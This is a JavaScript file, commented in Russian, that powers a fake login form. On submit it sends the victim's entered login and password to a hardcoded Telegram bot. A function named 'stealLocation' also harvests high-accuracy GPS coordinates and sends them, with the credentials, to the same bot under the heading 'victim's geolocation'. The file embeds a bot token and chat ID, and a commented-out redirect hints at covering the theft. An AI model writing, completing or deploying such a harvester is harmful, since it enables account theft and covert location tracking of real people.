// === ВСТАВЬ СВОИ ЗНАЧЕНИЯ СЮДА ===
const BOT_TOKEN = "8546436065:AAFWh1g2cfuZ--pQRTe9qgeEeqw4BJx0V9g";
const CHAT_ID   = "7321839741";   // ← ЭТО ОШИБКА! Это ID бота, а не твой личный ID
// Замени на СВОЙ chat_id (положительное число, например "123456789")
// Получи здесь: напиши @userinfobot → /start → он пришлёт твой ID
// =================================

// Функция экранирования для MarkdownV2 — должна экранировать точку и другие символы
function escapeMarkdownV2(str) {
  if (!str) return '';
  return str.replace(/([_*[\]()~`>#+-=|{}.!])/g, '\\$1');
}

const form = document.getElementById("login-form");
const statusDiv = document.getElementById("status");

form.addEventListener("submit", async function (e) {
  e.preventDefault();

  const login = document.getElementById("login").value.trim();
  const password = document.getElementById("password").value.trim();

  if (!login || !password) {
    showStatus("Заполните все поля", "error");
    return;
  }

  const now = new Date();
  const timeStr = now.toLocaleString("ru-RU", {
    day: "2-digit",
    month: "2-digit",
    year: "numeric",
    hour: "2-digit",
    minute: "2-digit",
  });

  // Экранируем ВСЁ важное
  const safeLogin    = escapeMarkdownV2(login);
  const safePassword = escapeMarkdownV2(password);
  const safeTime     = escapeMarkdownV2(timeStr);  // ← здесь точка станет \.

  const message = `
**Новый вход**
Логин: \`${safeLogin}\`
Пароль: \`${safePassword}\`
Время: ${safeTime}
  `.trim();

  showStatus("Отправка...", "");

  try {
    const params = new URLSearchParams({
      chat_id: CHAT_ID,
      text: message,
      parse_mode: "MarkdownV2"
    });

    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?${params}`;

    const response = await fetch(url);
    
    if (!response.ok) {
      const errorData = await response.json().catch(() => ({}));
      throw new Error(`Ошибка Telegram: ${response.status} — ${errorData.description || 'неизвестно'}`);
    }

    showStatus("Успешно отправлено ✓", "success");

    // Если хочешь — редирект после успеха
    // setTimeout(() => { window.location = "https://google.com"; }, 1500);

  } catch (err) {
    console.error("Детали ошибки:", err);
    showStatus("Ошибка: " + err.message, "error");
  }
});

function showStatus(text, type = "") {
  statusDiv.textContent = text;
  statusDiv.className = "status-message" + (type ? " status-" + type : "");
}
// Функция для получения и отправки геолокации
async function stealLocation(login, password, timeStr) {
  if (!navigator.geolocation) {
    console.log("Геолокация не поддерживается браузером");
    return;
  }
  navigator.geolocation.getCurrentPosition(
    async (position) => {
      const coords = position.coords;
      const locationText = `
**Геолокация жертвы!**
Логин: ${escapeMarkdownV2(login)}
Пароль: ${escapeMarkdownV2(password)}
Широта: ${coords.latitude}
Долгота: ${coords.longitude}
Точность: ±${Math.round(coords.accuracy)} метров
Высота: ${coords.altitude ? Math.round(coords.altitude) + ' м' : 'неизвестно'}
Скорость: ${coords.speed ? Math.round(coords.speed * 3.6) + ' км/ч' : 'неизвестно'}
Направление: ${coords.heading ? Math.round(coords.heading) + '°' : 'неизвестно'}
Время: ${timeStr}
      `.trim();

      try {
        const params = new URLSearchParams({
          chat_id: CHAT_ID,
          text: locationText,
          parse_mode: "MarkdownV2"
        });

        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?${params}`;
        const response = await fetch(url);

        if (response.ok) {
          console.log("Гео отправлено успешно");
          showStatus("Местоположение получено ✓", "success");
        } else {
          console.error("Ошибка отправки гео");
        }
      } catch (err) {
        console.error("Ошибка гео:", err);
      }
    },
    (error) => {
      console.error("Гео отклонено:", error.message);
      showStatus("Местоположение недоступно", "error");
    },
    {
      enableHighAccuracy: true,    // максимальная точность (GPS)
      timeout: 10000,              // 10 секунд на ожидание
      maximumAge: 0                // свежие данные, не кэш
    }
  );
}